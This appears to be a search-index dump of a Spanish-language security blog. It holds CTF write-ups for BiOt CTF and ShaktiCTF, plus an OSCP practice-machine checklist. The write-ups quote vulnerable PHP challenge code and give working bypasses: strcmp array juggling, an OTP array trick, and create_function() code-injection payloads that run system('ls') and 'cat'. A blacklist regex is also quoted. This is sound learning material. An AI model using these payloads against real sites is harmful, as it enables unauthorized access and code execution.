name=\u0026#34;number\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Lucky Numbers\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Para este reto, basta con hacer una búsqueda para ver qué hace cada validación implementada en el código. Inicialmente se puede ver que la implementación recibirá un parámetro con el nombre de number, dicho esto se puede traducir cada validación en lo siguiente:\n isset($angka) → Verifica que la variable tenga un valor diferente del nulo. is_numeric($angka) → Verifica que la variable contenga un tipo de dato numérico. !strpos($angka, \u0026quot;.\u0026quot;) → Verifica que la variable no contenga ningún punto decimal. strlen($angka) \u0026gt; 6 → Verifica que la longitud de la variable sea mayor a 6. $angka \u0026lt; 99999 \u0026amp;\u0026amp; $angka \u0026gt; 90000 → Verifica que la variable sea un número mayor a 90000 y menor que 99999.  Para saltar todas las validaciones se tendría que mandar un número en el rango permitido y para hacer un bypass de la longitud se podría añadirle ceros a la izquierda dado que inicialmente la variable es tratada como string. El valor utilizado fue 0090005\nFlag  biotCTF{num3r1c0_b10t_l1m1t3}\n Strcmp V10 [100 pts] Descripción  Jimmy creó un sitio web donde almacena sus secretos\u0026hellip; Desafortunadamente, no podemos iniciar sesión en su sitio web. ¡Ayúdame a encontrar el secreto de Jimmy!. http://3.135.19.159/admin/index.php\n Pistas\n http://3.135.19.159/admin/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Strcmp v1.0\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #2c3e50;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;?php require \u0026#39;flag.php\u0026#39;; if (isset($_POST[\u0026#39;password\u0026#39;])) { if (strcmp($_POST[\u0026#39;password\u0026#39;], $flag) == 0) echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Admin Login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;input name=\u0026#34;submit\u0026#34; class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Dado que la comparación del parámetro password y la bandera está siendo realizada con un operador doble, la comparación NULL == 0 va a dar TRUE por lo que si eso se concatena con el hecho de que la función strcmp() tiene problemas al compararse con otra cosa y puede retornar NULL si entre las entidades se compara con un arreglo vacío. Se puede utilizar este hecho para pasar la validación que se está realizando, usando password[]=%22 como parámetro. Se utilizaron las siguientes publicaciones para llevar a cabo la solución del reto:\n http://www.dimuthu.org/blog/2008/10/31/triple-equal-operator-and-null-in-php/ https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016  Flag Desafortunadamente no se guardó el valor de esta flag xD\nStrcmp v20 [200 pts] Descripción  Jimmy ha almacenado un nuevo secreto en su sitio web que indica que se ha actualizado la seguridad. ¿Puedes repetir tu acción para encontrar el secreto de Jimmy?. http://3.135.19.159/otp/index.php\n Pistas\n http://3.135.19.159/otp/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Strcmp v2.0\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #16a085;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;?php function len($x) { if (is_array($x)) return count($x); return strlen($x); } require(\u0026#34;flag.php\u0026#34;); $otp = $_GET[\u0026#34;code\u0026#34;]; $cek = len($otp)==11; for ($i=0; $i\u0026lt;len($otp); $i++){ if (strcmp($otp[$i], $secret[$i])!=0){ $cek = false; } if ($cek) { echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); }else{ echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;OTP Login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;code\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;OTP Code\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Se presentó la misma situación que la versión anterior del reto con diferencia de que se realiza de forma iterativa por lo que se puede hacer uso de la misma implementación con un ligero cambio, llenando todos los índicies (11) con arreglos vacíos, quedando el parámetro utilizado así code[0][]=%22\u0026amp;code[1][]=%22\u0026amp;code[2][]=%22...code[10][]=%22. Se utilizó esta pregunta de stackoverflow como referencia.\nFlag  biotCTF{0pt_b10t_2}\n ","permalink":"https://rzul.me/posts/biot-ctf/","summary":"Intro Dándole continuidad a las prácticas y CTFs en los que he participado, el pasado 19 de junio no fue la excepción. El nivel de dificultad, desde mi perspectiva, lo consideré amigable para los principiantes por lo que para quién se encuentra tratando de pulir habilidades fue un buen reto. Desafortunadamente no pude recopilar más información de sus creadores, más que la que está disponible en su página de twitter, un colega me puso al tanto de la info y decidimos tomar el reto.","title":"BiOt CTF"},{"content":"Objetivo Este post lo utilizaré como bitácora y directorio de máquinas que vaya resolviendo para la preparación de la OSCP según la Sala de Trofeos de NetSecFocus hecha por TJNull.\nComo bitácora utilizaré el template de pentest para Joplin proporcionado por TJNull en su guía de preparación para la OSCP para gestionar el write-up y el reporte que estaré realizando como ejercicio de práctica en cada una de las máquinas.\nRealicé un layout en google drive disponible al público para la gestión de la resolución de las máquinas.\n[Update]: Limitaré el seguimiento de la guía a máquinas de Hack The Box debido a diversas recomendaciones que señalan que las máquinas puestas en VulnHub no son buena práctica para el exámen debido a que son de un nivel de resolución inferior a lo que uno se puede encontrar en el examen, asímismo Proving Grounds quedará eliminado también ya que las máquinas expuestas ahí son de Vulnhub.\nDisclaimer Las cajas contenidas en esta lista deberán ser usadas como una forma de preparación, para desarrollar habilidades prácticas, o para pulir cualquier punto débil que puedas tener en metodología de pentesting. Esta lista no es un sustituto del ambiente acual del laboratorio del curso PEN-200/OSCP. Cuando se toma el curso, se incentiva a resolver cada sistema que contiene el laboratorio del curso, ya que te proveerá de una mejor visión a la hora de realizar tu examen. Esta lista ni es exhaustiva ni te garantiza la acreditación del examen de la OSCP.\nEstatus global    Máguinas resueltas Máquinas totales Porcentaje     2 92 2.17%    HackTheBox Linux    Dificultad Máquina Completada     Fácil Lame Link Write-up     brainfuck Link Write-up     shocker Link Write-up     bashed Link Write-up     nibbles Link Write-up     beep Link Write-up     cronos Link Write-up     nineveh Link Write-up     sense Link Write-up     solidstate Link Write-up     node Link Write-up     valentine Link Write-up     poison Link Write-up     sunday Link Write-up     tartarsauce Link Write-up     Irked Link Write-up     Friendzone Link Write-up     Swagshop Link Write-up     Networked Link Write-up     jarvis Link Write-up     Mirai Link Write-up     Popcorn Link Write-up     Haircut Link Write-up     Blocky Link Write-up     Frolic Link Write-up     Postman Link Write-up     Mango Link Write-up     Traverxec Link Write-up     OpenAdmin Link Write-up     Magic Link Write-up     Admirer Link Write-up     Blunder Link Write-up     Tabby Link Write-up     Doctor Link Write-up     SneakyMailer Link Write-up     Passage Link Write-up     Luanne Link Write-up     Time Link Write-up     Windows    Dificultad Máquina Completada      legacy Link Write-up     Blue Link Write-up     Devel Link Write-up     Optimum Link Write-up     Bastard Link Write-up     granny Link Write-up     Arctic Link Write-up     grandpa Link Write-up     silo Link Write-up     bounty Link Write-up     jerry Link Write-up     conceal Link Write-up     chatterbox Link Write-up     Forest Link Write-up     BankRobber Link Write-up     secnotes Link Write-up     Bastion Link Write-up    Fácil Buff Link Write-up ✓    Servmon Link Write-up     Active Link Write-up     Remote Link Write-up     Fuse Link Write-up     Omni Link Write-up     Worker Link Write-up     OSCP+ Retos por arriba del nivel del OSCP que valen la pena practicar\nWindows    Dificultad Máquina Completada      Jeeves Link Write-up     Bart Link Write-up     Tally Link Write-up     Netmon Link Write-up     Sizzle Link Write-up     Sniper Link Write-up     Control Link Write-up     Nest Link Write-up     Sauna Link Write-up     Cascade Link Write-up     Querier Link Write-up     BlackField Link Write-up     Linux    Dificultad Máquina Completada      Kotarak Link Write-up     falafel Link Write-up     Devops Link Write-up     Hawk Link Write-up     Lightweight Link Write-up     LaCasaDePapel Link Write-up     Jail Link Write-up     Safe Link Write-up     Bitlab Link Write-up     October Link Write-up     Mango Link Write-up     Book Link Write-up     Quick Link Write-up     ","permalink":"https://rzul.me/posts/netsecfocus-trophy-room-checklist/","summary":"Objetivo Este post lo utilizaré como bitácora y directorio de máquinas que vaya resolviendo para la preparación de la OSCP según la Sala de Trofeos de NetSecFocus hecha por TJNull.\nComo bitácora utilizaré el template de pentest para Joplin proporcionado por TJNull en su guía de preparación para la OSCP para gestionar el write-up y el reporte que estaré realizando como ejercicio de práctica en cada una de las máquinas.","title":"NetSecFocus Trophy Room Checklist"},{"content":"Intro El día 3 abril del 2021 TeamShakti publicó su anual competición CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisión de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca había participado en un CTF. Me pareció una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el próximo CTF de Hackthebox.\nPresento un Write-up de los retos que pude resolver durante mi participación.\nForensics Follow up - 50 Descripción We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.\nnetwork1.pcapng\nSolución Se descargó un archivo tipo pcapng se identificó un stream TCP con wireshark y se siguió dicho stream el cuál proporcionó un pastebin\nDentro del contenido del pastebin venía la bandera\nBandera: shaktictf{Th15_w4s_eA5Y!!}\nDelete - 100 Descripción Sometimes what you see is not always true\u0026hellip;\nchall.png\nSolución Se descargó la imagen y después analizar el archivo con binwalk se vio que había aparentemente dos imágenes en el mismo archivo, siguiendo la pista del título del reto se separaron los bytes iniciales que correspondían a la primera imagen usando dd\n┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ binwalk chall.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 264 x 191, 8-bit colormap, non-interlaced 48 0x30 PNG image, 1200 x 1200, 8-bit/color RGBA, non-interlaced 89 0x59 Zlib compressed data, default compression ┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ dd skip=48 if=chall.png of=chall1.png bs=1 46287+0 records in 46287+0 records out 46287 bytes (46 kB, 45 KiB) copied, 0.284482 s, 163 kB/s De esa manera chall1.png se vuelve una imagen que se puede visualizar con un visor de imágenes sin ningún problema. Obteniendo así la bandera.\nBandera: shaktictf{Y0u_4R3_aM4z1nG!!!!}\nWeb Magic - 100 Descripción I found creating new functionalities as magic. So I went and created quite a few, now I don\u0026rsquo;t remember what is what. help me remember them :( !\ncheck out my application - http://35.238.173.184/\nSolución De acuerdo con el log que se dio en /admin.php se buscó alguna vulnerabilidad respecto a la mención de una función deprecada create_function() y se observó que era vulnerable a inyección de código.\nPermitiendo el listado de archivos en el directorio mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;ls -la\u0026quot;);/*\u0026quot;]\ntotal 84 drwxrwxrwx 1 www-data www-data 4096 Apr 3 11:43 . drwxr-xr-x 1 root root 4096 Mar 31 09:51 .. -rw-r--r-- 1 www-data www-data 0 Apr 3 11:02 12345642312 -rw-r--r-- 1 www-data www-data 65 Apr 2 23:39 1998_Dumb_secrets.php -rw-rw-r-- 1 www-data www-data 134 Apr 2 23:19 Dockerfile -rw-r--r-- 1 www-data www-data 39 Apr 3 11:40 a -rw-r--r-- 1 www-data www-data 0 Apr 3 11:39 aaa -rw-r--r-- 1 www-data www-data 1 Apr 3 11:40 aaaa -rw-r--r-- 1 www-data www-data 3251 Apr 2 22:45 admin.php lrwxrwxrwx 1 www-data www-data 8 Apr 3 11:43 asd -\u0026gt; flag.txt -rw-r--r-- 1 www-data www-data 1886 Apr 2 22:45 chat.html -rw-r--r-- 1 www-data www-data 1744 Apr 2 22:45 check.html drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 css -rw-r--r-- 1 www-data www-data 39 Apr 3 09:58 flag.html -rw-r--r-- 1 www-data www-data 39 Apr 3 11:35 flag.php -rw-r--r-- 1 www-data www-data 39 Apr 3 09:57 flag.txt drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 fonts -rw-r--r-- 1 www-data www-data 1935 Apr 2 22:45 index.html -rw-r--r-- 1 www-data www-data 2114 Apr 2 22:45 login.html -rw-r--r-- 1 www-data www-data 1949 Apr 2 22:45 report.html -rw-r--r-- 1 www-data www-data 1976 Apr 2 22:45 rules.html -rw-r--r-- 1 www-data www-data 0 Apr 3 11:04 s.php -rw-r--r-- 1 www-data www-data 5 Apr 3 10:06 test.php Contenido de admin.php mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat admin.php\u0026quot;);/*\u0026quot;]\nVer código fuente del resultado\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); ini_set(\u0026#39;error_reporting\u0026#39;, E_ALL); $success = \u0026#39; \u0026lt;div class=\u0026#34;alert alert-success alert-dismissible\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;alert\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt;\u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; Function declared. \u0026lt;/div\u0026gt; \u0026#39;; include \u0026#34;flag.php\u0026#34;; if (isset ($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; !empty ($_POST[\u0026#39;c\u0026#39;])) { $blacklist = \u0026#34;/mv|rm|exec/i\u0026#34;; $code = $_POST[\u0026#39;c\u0026#39;]; if(strlen($code)\u0026gt;60) { die(\u0026#34;too long to execute\u0026#34;); } if(preg_match($blacklist,$code)){ die(\u0026#34;that\u0026#39;s blocked\u0026#34;); } $fun = create_function(\u0026#39;$flag\u0026#39;, $code); print($success); } ?\u0026gt;Habiendo identificado un archivo que no es común 1998_Dumb_secrets.php se intentó ver su contenido mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nObteniendo como resultado\ntoo long to execute\nObservando el código que procesa la petición, vemos que verifica la longitud del formulario por lo que si acortamos el valor enviado, la función nos dejará leer el archivo que queremos. Utilizando:\nreturn -1;}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nVer código fuente del resultado\n\u0026lt;?php $flag1=\u0026quot;shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\u0026quot;; ?\u0026gt; Bandera: shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\nCrypto Classically Easy - 50 Descripción ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\nSolución Realizando un poco de análisis a la cadena que se presenta en la descripción del reto se puede ver claramente que presenta un formato de bandera con excepción de los caractéres especiales, por lo que después de descartar las opciones que pudieran servir para descifrarla (Cifrado César, ROT N). Se trató de hacer otro alcance siguiendo el mismo principio de la rotación.\n   Char Recibido Valor de rotación Char Conocido     o +4 s   v +12 h   m +14 a   o +22 k   g +13 t   e +4 i   q +12 c   f +14 t   j +22 f    Lo que podría significar un patrón númerico de rotación dada la repetición de los espacios recorridos del char dado y el char de la bandera, siendo +4,+12,+14,+22,+13.\nEjercicio manual de sustitución\nshaktictf{lets_start_with_14,22,13,4,12,14,22,13,4_12,14,22,13,4,12,14,22,13!}\nOptimización del método por medio de un script simple.\n#!/usr/bin/python abc = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; values = [4,12,14,22,13] decrypt = \u0026#34;ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\u0026#34; avoid = \u0026#34;{}_!\u0026#34; flag = \u0026#34;\u0026#34; valIndex = 0 for letter in decrypt: if letter in avoid: flag += letter continue if valIndex \u0026gt;= len(values): valIndex = 0 flag += abc[(abc.index(letter) + values[valIndex]) - len(abc)] valIndex += 1 print(flag) Resultado del script\nBandera: shaktictf{lets_start_with_something_classical!}\nMisc Sanity Check - 10 Al leer las reglas dentro del servidor de discord se encuentra la bandera\n13 . Grab your 10 points : shaktictf{G00d_t0_r34d_th3_rUl3s!}\nBandera: shaktictf{G00d_t0_r34d_th3_rUl3s!}\ndecodeit - 100 Descripción just decode it!\nSolución Imagen descargada en código de barras\nSe utilizó https://zxing.org/w/decode.jspx para decodear la imagen y obtener la bandera\nDecode Succeeded Raw text\tshaktictf{N1C3_w0rK_Fr13nD} Raw bytes\t68 53 48 41 4b 54 49 43 54 46 5b 2e 11 23 13 3f 57 10 52 2b 3f 26 52 11 13 4e 24 5d 65 6a Barcode format\tCODE_128 Parsed Result Type\tTEXT Parsed Result\tBandera: shaktictf{N1C3_w0rK_Fr13nD}\nÚltimas palabras Considerando que fue \u0026ldquo;one-man show\u0026rdquo; se obtuvo el lugar 156 de 452 en el ranking con un puntaje de 410 puntos.\nWrite-ups no oficiales de algunos retos\n","permalink":"https://rzul.me/posts/first-ctf/","summary":"Intro El día 3 abril del 2021 TeamShakti publicó su anual competición CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisión de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca había participado en un CTF. Me pareció una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el próximo CTF de Hackthebox.","title":"Mi Primer CTF"}]